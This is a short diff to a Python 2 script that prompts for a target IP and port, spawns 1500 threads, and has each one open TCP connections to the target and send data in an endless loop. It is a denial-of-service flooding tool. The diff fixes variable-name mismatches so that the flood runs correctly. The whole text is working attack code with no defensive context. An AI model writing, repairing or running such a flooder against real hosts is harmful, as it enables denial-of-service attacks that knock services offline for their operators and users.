@@ -3,9 +3,8 @@ import socket
 import random
 import time
 
-print (" ")
 IP = raw_input("IP : ")
-port = input("Port : ")
+Port = input("Port : ")
 thread_num = input("Threads ( Default 1500 ) : ")
 thread_num = 1500
 print "Please Wait While Packages Are Preparing Thread :",thread_num
@@ -16,7 +15,7 @@ def run():
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((str(ip),int(port))) 
+			s.connect((str(IP),int(Port))) 
 			s.send(bytes)
 			print "Package Sent !"
 		except:
